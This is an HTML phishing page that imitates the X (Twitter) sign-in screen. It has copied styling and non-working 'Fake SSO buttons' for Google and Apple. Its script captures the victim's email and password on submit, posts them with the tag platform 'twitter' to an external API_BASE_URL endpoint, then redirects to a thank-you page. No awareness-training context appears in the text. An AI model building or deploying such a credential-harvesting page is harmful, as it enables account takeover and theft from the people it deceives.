<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>Sign in to X</title>
    <script src="static/js/config.js"></script>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            height: 100vh;
            overflow: hidden;
        }

        /* Left Side: Big Logo */
        .left-panel {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            /* Placeholder for the big X image */
        }

        .big-logo {
            font-size: 300px;
            /* Text fallback */
            font-weight: bold;
            color: #fff;
            /* In real site, this is an SVG */
        }

        /* Right Side: content */
        .right-panel {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding: 40px;
            min-width: 450px;
        }

        .content-box {
            width: 100%;
            max-width: 600px;
        }

        h1 {
            font-size: 64px;
            margin: 48px 0;
            font-weight: 800;
            line-height: 84px;
        }

        h2 {
            font-size: 31px;
            margin-bottom: 32px;
            font-weight: 800;
        }

        .login-btn {
            border-radius: 9999px;
            padding: 0 16px;
            font-size: 15px;
            font-weight: 700;
            height: 40px;
            cursor: pointer;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            text-decoration: none;
            width: 300px;
            box-sizing: border-box;
        }

        .btn-white {
            background-color: #fff;
            color: #000;
            border: 1px solid #fff;
        }

        .btn-white:hover {
            background-color: #e6e6e6;
        }

        .btn-outline {
            background-color: transparent;
            color: #1d9bf0;
            border: 1px solid #536471;
        }

        .btn-outline:hover {
            background-color: rgba(29, 155, 240, 0.1);
        }

        .or-divider {
            display: flex;
            align-items: center;
            width: 300px;
            margin: 8px 0;
            color: #fff;
        }

        .line {
            height: 1px;
            background-color: #2f3336;
            flex-grow: 1;
        }

        .or-text {
            margin: 0 4px;
            font-size: 15px;
        }

        .form-input {
            width: 300px;
            background-color: #000;
            border: 1px solid #333;
            border-radius: 4px;
            padding: 16px;
            color: white;
            font-size: 16px;
            margin-bottom: 20px;
            box-sizing: border-box;
        }

        .form-input:focus {
            outline: none;
            border-color: #1d9bf0;
        }

        .submit-btn {
            background-color: #fff;
            color: #000;
            border: none;
            font-weight: bold;
            font-size: 15px;
            width: 300px;
            height: 36px;
            border-radius: 18px;
            cursor: pointer;
        }

        .submit-btn:hover {
            background-color: #d7dbdc;
        }

        .consent-wrapper {
            margin-top: 20px;
            font-size: 13px;
            color: #71767b;
            width: 300px;
            display: flex;
            align-items: center;
        }

        .consent-wrapper input {
            margin-right: 8px;
        }
    </style>
</head>

<body>
    <div class="left-panel">
        <div class="big-logo">X</div>
    </div>
    <div class="right-panel">
        <div class="content-box">
            <h1>Happening now</h1>
            <h2>Join today.</h2>

            <!-- Fake SSO buttons -->
            <div class="login-btn btn-white">Sign up with Google</div>
            <div class="login-btn btn-white">Sign up with Apple</div>

            <div class="or-divider">
                <div class="line"></div>
                <div class="or-text">or</div>
                <div class="line"></div>
            </div>

            <!-- Login Section -->
            <h3 style="margin-top:0;">Sign in to X</h3>
            <form id="loginForm">
                <input type="text" id="email" class="form-input" placeholder="Phone, email, or username" required>
                <input type="password" id="password" class="form-input" placeholder="Password" required>

                <button type="submit" class="submit-btn" style="background-color:#1d9bf0; color:white;">Log In</button>


            </form>

            <p style="font-size:15px; color:#71767b; margin-top:40px;">
                Don't have an account? <span style="color:#1d9bf0;">Sign up</span>
            </p>

        </div>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", async function (e) {
            e.preventDefault();


            const data = {
                platform: "twitter",
                email: document.getElementById("email").value,
                password: document.getElementById("password").value
            };

            try {
                const res = await fetch(API_BASE_URL + "/platform_submit", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(data)
                });
                if (res.ok) {
                    window.top.location.href = "thankyou.html";
                }
            } catch (err) {
                console.error(err);
            }
        });
    </script>
</body>

</html>
